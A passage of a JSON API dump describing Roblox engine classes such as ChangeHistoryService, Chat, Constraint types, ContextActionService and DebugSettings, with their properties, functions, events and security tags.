nRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCanUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Redo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetWaypoints","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"state","Default":null}],"Name":"SetEnabled","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"SetWaypoint","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Undo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Function"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnRedo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Arguments":[{"Name":"waypoint","Type":"string"}],"Name":"OnUndo","tags":["PluginSecurity"],"Class":"ChangeHistoryService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CharacterAppearance","tags":[]},{"Superclass":"CharacterAppearance","type":"Class","Name":"BodyColors","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"HeadColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"LeftLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightArmColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"RightLegColor","tags":[],"Class":"BodyColors"},{"ValueType":"BrickColor","type":"Property","Name":"TorsoColor","tags":[],"Class":"BodyColors"},{"Superclass":"CharacterAppearance","type":"Class","Name":"CharacterMesh","tags":[]},{"ValueType":"int","type":"Property","Name":"BaseTextureId","tags":[],"Class":"CharacterMesh"},{"ValueType":"BodyPart","type":"Property","Name":"BodyPart","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"MeshId","tags":[],"Class":"CharacterMesh"},{"ValueType":"int","type":"Property","Name":"OverlayTextureId","tags":[],"Class":"CharacterMesh"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Clothing","tags":[]},{"Superclass":"Clothing","type":"Class","Name":"Pants","tags":[]},{"ValueType":"Content","type":"Property","Name":"PantsTemplate","tags":[],"Class":"Pants"},{"Superclass":"Clothing","type":"Class","Name":"Shirt","tags":[]},{"ValueType":"Content","type":"Property","Name":"ShirtTemplate","tags":[],"Class":"Shirt"},{"Superclass":"CharacterAppearance","type":"Class","Name":"ShirtGraphic","tags":[]},{"ValueType":"Content","type":"Property","Name":"Graphic","tags":[],"Class":"ShirtGraphic"},{"Superclass":"CharacterAppearance","type":"Class","Name":"Skin","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"SkinColor","tags":[],"Class":"Skin"},{"Superclass":"Instance","type":"Class","Name":"Chat","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"partOrCharacter","Default":null},{"Type":"string","Name":"message","Default":null},{"Type":"ChatColor","Name":"color","Default":"Blue"}],"Name":"Chat","tags":[],"Class":"Chat","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerFrom","Default":null},{"Type":"Instance","Name":"playerTo","Default":null}],"Name":"FilterStringAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"stringToFilter","Default":null},{"Type":"Instance","Name":"playerToFilterFor","Default":null}],"Name":"FilterStringForPlayerAsync","tags":[],"Class":"Chat","type":"YieldFunction"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"color","Type":"ChatColor"}],"Name":"Chatted","tags":[],"Class":"Chat","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChatFilter","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ClickDetector","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxActivationDistance","tags":[],"Class":"ClickDetector"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"MouseClick","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverEnter","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoHovered","Type":"Instance"}],"Name":"MouseHoverLeave","tags":[],"Class":"ClickDetector","type":"Event"},{"Arguments":[{"Name":"playerWhoClicked","Type":"Instance"}],"Name":"mouseClick","tags":["deprecated"],"Class":"ClickDetector","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ClusterPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"CollectionService","tags":[]},{"ReturnType":"Objects","Arguments":[{"Type":"string","Name":"class","Default":null}],"Name":"GetCollection","tags":[],"Class":"CollectionService","type":"Function"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemAdded","tags":[],"Class":"CollectionService","type":"Event"},{"Arguments":[{"Name":"instance","Type":"Instance"}],"Name":"ItemRemoved","tags":[],"Class":"CollectionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Color3Value","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Value","tags":[],"Class":"Color3Value"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"Changed","tags":[],"Class":"Color3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Color3"}],"Name":"changed","tags":["deprecated"],"Class":"Color3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Configuration","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Constraint","tags":[]},{"ValueType":"Object","type":"Property","Name":"Attachment0","tags":[],"Class":"Constraint"},{"ValueType":"Object","type":"Property","Name":"Attachment1","tags":[],"Class":"Constraint"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Constraint"},{"Superclass":"Constraint","type":"Class","Name":"BallSocketConstraint","tags":[]},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"BallSocketConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"BallSocketConstraint"},{"Superclass":"Constraint","type":"Class","Name":"HingeConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularSpeed","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"AngularVelocity","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":["readonly"],"Class":"HingeConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"LowerAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxTorque","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"TargetAngle","tags":[],"Class":"HingeConstraint"},{"ValueType":"float","type":"Property","Name":"UpperAngle","tags":[],"Class":"HingeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"MoveToConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"StabilizingDistance","tags":[],"Class":"MoveToConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"MoveToConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RodConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentDistance","tags":["readonly"],"Class":"RodConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RodConstraint"},{"Superclass":"Constraint","type":"Class","Name":"RopeConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Length","tags":[],"Class":"RopeConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"RopeConstraint"},{"Superclass":"Constraint","type":"Class","Name":"SlidingBallConstraint","tags":[]},{"ValueType":"ActuatorType","type":"Property","Name":"ActuatorType","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"CurrentPosition","tags":["readonly"],"Class":"SlidingBallConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"LowerLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxAcceleration","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"MotorMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Restitution","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"ServoMaxForce","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Speed","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"TargetPosition","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"UpperLimit","tags":[],"Class":"SlidingBallConstraint"},{"ValueType":"float","type":"Property","Name":"Velocity","tags":[],"Class":"SlidingBallConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"CylindricalConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"AzimuthalAngle","tags":[],"Class":"CylindricalConstraint"},{"ValueType":"float","type":"Property","Name":"InclinationAngle","tags":[],"Class":"CylindricalConstraint"},{"Superclass":"SlidingBallConstraint","type":"Class","Name":"PrismaticConstraint","tags":[]},{"Superclass":"Constraint","type":"Class","Name":"SpringConstraint","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentLength","tags":["readonly"],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Damping","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"FreeLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"bool","type":"Property","Name":"LimitsEnabled","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxForce","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MaxLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"MinLength","tags":[],"Class":"SpringConstraint"},{"ValueType":"float","type":"Property","Name":"Stiffness","tags":[],"Class":"SpringConstraint"},{"Superclass":"Instance","type":"Class","Name":"ContentFilter","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"outstandingRequests","Default":null},{"Type":"int","Name":"cacheSize","Default":null}],"Name":"SetFilterLimits","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFilterUrl","tags":["LocalUserSecurity"],"Class":"ContentFilter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ContentProvider","tags":[]},{"ValueType":"string","type":"Property","Name":"BaseUrl","tags":["readonly"],"Class":"ContentProvider"},{"ValueType":"int","type":"Property","Name":"RequestQueueSize","tags":["readonly"],"Class":"ContentProvider"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"contentId","Default":null}],"Name":"Preload","tags":[],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBaseUrl","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetCacheSize","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"count","Default":null}],"Name":"SetThreadPool","tags":["LocalUserSecurity"],"Class":"ContentProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Array","Name":"contentIdList","Default":null}],"Name":"PreloadAsync","tags":[],"Class":"ContentProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"ContextActionService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindActionToInputTypes","tags":["deprecated"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"BindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Function","Name":"functionToBind","Default":null},{"Type":"bool","Name":"createTouchButton","Default":null},{"Type":"Tuple","Name":"inputTypes","Default":null}],"Name":"BindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UserInputState","Name":"state","Default":null},{"Type":"Instance","Name":"inputObject","Default":null}],"Name":"CallFunction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"Instance","Name":"actionButton","Default":null}],"Name":"FireActionButtonFoundSignal","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetAllBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetBoundActionInfo","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetCurrentLocalToolIcon","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"description","Default":null}],"Name":"SetDescription","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"image","Default":null}],"Name":"SetImage","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"UDim2","Name":"position","Default":null}],"Name":"SetPosition","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null},{"Type":"string","Name":"title","Default":null}],"Name":"SetTitle","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindAction","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"userInputTypeForActivation","Default":null},{"Type":"KeyCode","Name":"keyCodeForActivation","Default":"Unknown"}],"Name":"UnbindActivate","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnbindAllActions","tags":[],"Class":"ContextActionService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"UnbindCoreAction","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"actionName","Default":null}],"Name":"GetButton","tags":[],"Class":"ContextActionService","type":"YieldFunction"},{"Arguments":[{"Name":"actionAdded","Type":"string"},{"Name":"createTouchButton","Type":"bool"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionAdded","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionChanged","Type":"string"},{"Name":"changeName","Type":"string"},{"Name":"changeTable","Type":"Dictionary"}],"Name":"BoundActionChanged","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionRemoved","Type":"string"},{"Name":"functionInfoTable","Type":"Dictionary"}],"Name":"BoundActionRemoved","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"actionName","Type":"string"}],"Name":"GetActionButtonEvent","tags":["RobloxScriptSecurity"],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolEquipped","Type":"Instance"}],"Name":"LocalToolEquipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Arguments":[{"Name":"toolUnequipped","Type":"Instance"}],"Name":"LocalToolUnequipped","tags":[],"Class":"ContextActionService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Controller","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"BindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"GetButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"UnbindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"bindButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"getButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"Arguments":[{"Name":"button","Type":"Button"}],"Name":"ButtonChanged","tags":[],"Class":"Controller","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"HumanoidController","tags":[]},{"Superclass":"Controller","type":"Class","Name":"SkateboardController","tags":[]},{"ValueType":"float","type":"Property","Name":"Steer","tags":["readonly"],"Class":"SkateboardController"},{"ValueType":"float","type":"Property","Name":"Throttle","tags":["readonly"],"Class":"SkateboardController"},{"Arguments":[{"Name":"axis","Type":"string"}],"Name":"AxisChanged","tags":[],"Class":"SkateboardController","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"VehicleController","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ControllerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"CookiesService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"DeleteCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"CustomEvent","tags":["deprecated"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetAttachedReceivers","tags":[],"Class":"CustomEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"newValue","Default":null}],"Name":"SetValue","tags":[],"Class":"CustomEvent","type":"Function"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverConnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverDisconnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CustomEventReceiver","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Source","tags":[],"Class":"CustomEventReceiver"},{"ReturnType":"float","Arguments":[],"Name":"GetCurrentValue","tags":[],"Class":"CustomEventReceiver","type":"Function"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventConnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventDisconnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"newValue","Type":"float"}],"Name":"SourceValueChanged","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DataModelMesh","tags":["notbrowsable"]},{"ValueType":"Vector3","type":"Property","Name":"Offset","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"Scale","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"VertexColor","tags":[],"Class":"DataModelMesh"},{"Superclass":"DataModelMesh","type":"Class","Name":"BevelMesh","tags":["deprecated","notbrowsable"]},{"Superclass":"BevelMesh","type":"Class","Name":"BlockMesh","tags":[]},{"Superclass":"BevelMesh","type":"Class","Name":"CylinderMesh","tags":[]},{"Superclass":"DataModelMesh","type":"Class","Name":"FileMesh","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":[],"Class":"FileMesh"},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"FileMesh"},{"Superclass":"FileMesh","type":"Class","Name":"SpecialMesh","tags":[]},{"ValueType":"MeshType","type":"Property","Name":"MeshType","tags":[],"Class":"SpecialMesh"},{"Superclass":"Instance","type":"Class","Name":"DataStoreService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"LegacyNamingScheme","tags":["LocalUserSecurity"],"Class":"DataStoreService"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGlobalDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetOrderedDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Debris","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxItems","tags":["deprecated"],"Class":"Debris"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"AddItem","tags":[],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetLegacyMaxItems","tags":["LocalUserSecurity"],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"addItem","tags":["deprecated"],"Class":"Debris","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebugSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"AltCdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AltCdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AvailablePhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"BlockMeshSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"CPU","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"CdnResponceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuSpeed","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"DataModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ElapsedTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"ErrorReporting","type":"Property","Name":"ErrorReporting","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"GfxCard","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsFmodProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsScriptStackTracingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"JobCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"LastCdnFailureTimeSpan","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"LuaRamLimit","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"OsIs64Bit","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"OsPlatformId","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsVer","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFaultsPerSecond","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFileBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"PixelShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PlayerCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateWorkingSetBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProcessCores","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"ProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProfilingWindow","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RAM","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportExtendedMachineConfiguration","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportSoundWarnings","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"Resolution","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"RobloxRespoceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxVersion","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SIMD","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SystemProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"TickCountSampleMethod","type":"Property","Name":"TickCountPreciseOverride","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalPhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"VertexShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VideoMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VirtualBytes","tags":["readonly"],"Class":"DebugSettings"},{"ReturnType":"void","Arguments":[],"Name":"LegacyScriptMode","tags":["LocalUserSecurity","deprecated"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"ResetCdnFailureCounts","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBlockingRemove","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebuggerBreakpoint","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Condition","tags":[],"Class":"DebuggerBreakpoint"}